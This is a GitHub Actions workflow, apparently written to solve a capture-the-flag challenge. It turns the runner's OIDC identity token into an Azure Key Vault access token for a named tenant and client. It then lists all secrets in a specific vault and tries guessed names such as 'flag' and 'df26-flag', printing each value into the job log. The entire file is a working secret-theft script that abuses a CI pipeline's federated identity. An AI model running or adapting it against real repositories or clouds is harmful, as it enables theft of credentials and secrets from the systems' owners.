name: get-flag
on: [workflow_dispatch]

permissions:
  id-token: write
  contents: read

jobs:
  get-flag:
    runs-on: ubuntu-latest
    environment: copilot
    steps:
      - name: Get flag from Key Vault
        run: |
          TOKEN_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange"
          OIDC_TOKEN=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${TOKEN_URL}" | jq -r '.value')

          TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
          CLIENT="72ff278a-9e71-43ec-bac4-2ca303f8e462"
          LOGIN="https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token"
          GRANT="urn:ietf:params:oauth:grant-type:jwt-bearer"
          ASSERTION_TYPE="urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
          SCOPE="https://vault.azure.net/.default"

          AZ_TOKEN=$(curl -s -X POST "${LOGIN}" \
            --data-urlencode "client_id=${CLIENT}" \
            --data-urlencode "grant_type=${GRANT}" \
            --data-urlencode "client_assertion_type=${ASSERTION_TYPE}" \
            --data-urlencode "client_assertion=${OIDC_TOKEN}" \
            --data-urlencode "scope=${SCOPE}" \
            | jq -r '.access_token')

          echo "Token length: ${#AZ_TOKEN}"

          VAULT="https://kv-tbl-sec-x3euoz.vault.azure.net"

          echo "=== List all secrets ==="
          curl -s -H "Authorization: Bearer ${AZ_TOKEN}" "${VAULT}/secrets?api-version=7.4"

          echo ""
          echo "=== Try flag names ==="
          for S in flag ctf-flag df26 df26-flag secret answer DF26; do
            RESULT=$(curl -s -H "Authorization: Bearer ${AZ_TOKEN}" "${VAULT}/secrets/${S}?api-version=7.4")
            echo "--- ${S}: ${RESULT}"
          done
